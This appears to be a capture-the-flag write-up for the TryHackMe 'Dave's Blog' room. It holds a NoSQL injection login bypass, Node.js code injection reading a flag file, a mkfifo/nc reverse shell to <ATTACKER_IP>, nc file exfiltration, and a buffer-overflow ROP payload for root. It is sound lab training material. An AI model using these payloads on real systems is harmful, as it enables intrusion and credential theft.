# [Dave's Blog](https://tryhackme.com/room/davesblog)

## My friend Dave made his own blog!

# Dave's Blog

## My friend Dave made his own blog! You should go check it out.

### Flag 1

1. Start by scanning the target to identify open ports and services

_What's there to inject when there's no SQL?_

```bash
nmap <TARGET_IP>
```

<img width="722" height="287" alt="SCREEN01" src="https://github.com/user-attachments/assets/e7889cf6-b203-471f-b616-3102b29f42df" />

2. Use gobuster to discover hidden directories and files

```bash
gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="722" height="410" alt="SCREEN02" src="https://github.com/user-attachments/assets/dbba1555-def0-43d0-b087-d3e21fd49cb0" />

3. Navigate to `http://<TARGET_IP>/admin` and examine the page source. In the JavaScript code, we find a hint for injection vulnerability

```html
<script>
  if (document.location.hash) {
    const div = document.createElement("div");
    div.innerText = decodeURIComponent(document.location.hash.substr(1));
    div.className = "note";
    document.body.insertBefore(div, document.body.firstChild);
  }
  document.querySelector("form").onsubmit = (e) => {
    /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
  };
</script>
```

4. Since this appears to be a MongoDB backend, we can attempt a NoSQL injection. Capture the login request from `http://<TARGET_IP>/admin` with Burp Suite and modify it
   - Change the `Content-Type` header to `application/json`
   - Use a NoSQL injection payload that bypasses authentication
   - The `$ne` (not equal) operator in MongoDB will match any password that is not an empty string, effectively bypassing authentication

```
POST /admin HTTP/1.1
Host: <TARGET_IP>
Content-Length: 42
Content-Type: application/json

{"username":"dave","password":{"$ne":""}}
```

<img width="1032" height="384" alt="SCREEN04" src="https://github.com/user-attachments/assets/dac9b5db-d866-49ff-ac0d-e4a346c144dd" />

5. After successful injection, the server responds with a JWT token. Decode this token using [CyberChef](https://gchq.github.io/CyberChef/) or any JWT decoder to extract the payload. The decoded payload reveals the first flag and Dave's actual password

<img width="1676" height="670" alt="SCREEN05" src="https://github.com/user-attachments/assets/9c376872-0b52-4eda-9089-4019e1dbb7f4" />

---

### Flag 2 / User flag

1. Login to `http://<TARGET_IP>/admin` using the credentials discovered from the JWT token (username: `dave`, password from the decoded JWT)

2. The admin panel has an execution feature. Capture the POST request with Burp Suite and test for command injection
   - This payload uses Node.js's `require` function to read the user flag file directly

```
POST /admin/exec HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/json
Content-Length: 68
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NTc5NjAyMDZ9.t4CEy260DiaUlminL1apSfoYYRCmMyy8knujuuWgHBM

{"exec":"require('fs').readFileSync('/home/dave/user.txt')"}
```

<img width="828" height="356" alt="SCREEN06" src="https://github.com/user-attachments/assets/c2dd9fa6-05ad-4366-8ecf-b27e6d3940da" />

---

### Flag 3

_mongo deeper_

1. Prepare to catch a reverse shell on your attacking machine

```bash
nc -lvnp 4444
```

2. Use the command injection vulnerability to establish a reverse shell. Send the following payload through the admin exec endpoint
   - This creates a named pipe for bidirectional communication and establishes a reverse shell

```
POST /admin/exec HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/json
Content-Length: 126
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJfaWQiOiI1ZWM2ZTVjZjFkYzRkMzY0YmY4NjQxMDciLCJ1c2VybmFtZSI6ImRhdmUiLCJwYXNzd29yZCI6IlRITXtTdXBlclNlY3VyZUFkbWluUGFzc3dvcmQxMjN9IiwiX192IjowLCJpYXQiOjE3NTgwMzUyNTh9.ItLu2YD6loxQyxakHVCmNUA2XOYlWQNiprKIdFOzCIc

{"exec":"require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> 4444 >/tmp/f')"}
```

3. Once you receive the shell, stabilize it for better interaction

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

4. Since the hint mentions "mongo deeper", investigate the MongoDB database
   - This reveals a hidden collection containing the third flag

```bash
mongo
show dbs
use daves-blog
show tables
db.whatcouldthisbes.find()
```

<img width="723" height="435" alt="SCREEN09" src="https://github.com/user-attachments/assets/940b25f1-166e-4e1c-8a74-22ee2f59b966" />

---

### Flag 4

1. Check what commands the current user can run with sudo privileges
   - This reveals that the user can run `/uid_checker` as root without a password

```bash
sudo -l
```

<img width="721" height="159" alt="SCREEN07" src="https://github.com/user-attachments/assets/0309f1ab-3a62-4f55-be1e-a27ba7fdfa0c" />

2. The `strings` command reveals hardcoded text including the fourth flag embedded in the binary

```bash
strings /uid_checker
```

<img width="721" height="433" alt="SCREEN08" src="https://github.com/user-attachments/assets/d0ec6360-a979-48c7-8152-8e72ac5acb5e" />

---

### Flag 5 / Root flag

_from pwn import \*_

1. First, transfer the binary to your attacking machine for analysis

On your attacking machine:

```bash
nc -lvnp 5555 > uid_checker
```

On the target machine:

```bash
nc <ATTACKER_IP> 5555 < /uid_checker
```

2. Analyze the binary to identify the buffer overflow vulnerability and create a Python script to exploit the buffer overflow

```PYTHON
#!/usr/bin/env python
from struct import *

buf = ""
buf += "A"*88
buf += pack("<Q", 0x400803)
buf += pack("<Q", 0x601060)
buf += pack("<Q", 0x4005b0)
buf += pack("<Q", 0x400803)
buf += pack("<Q", 0x601060)
buf += pack("<Q", 0x400570)

f = open("in.txt", "w")
f.write(buf)
```

4. Run the Python script to generate the payload

```bash
python script.py
```

5. Set up a simple HTTP server to transfer the payload

```bash
python -m SimpleHTTPServer
```

6. On the target machine, download the payload file

```bash
wget http://<ATTACKER_IP>:8000/in.txt
```

7. Run the exploit against the SUID binary to gain root access
   - This pipes the payload into the program and keeps stdin open for interaction
   - With root access, read the final flag

```bash
(cat in.txt;cat)| sudo /uid_checker
cat /root/root.txt
```

<img width="720" height="180" alt="SCREEN10" src="https://github.com/user-attachments/assets/4ce00023-b9cc-4743-9a79-e79dc9efa805" />
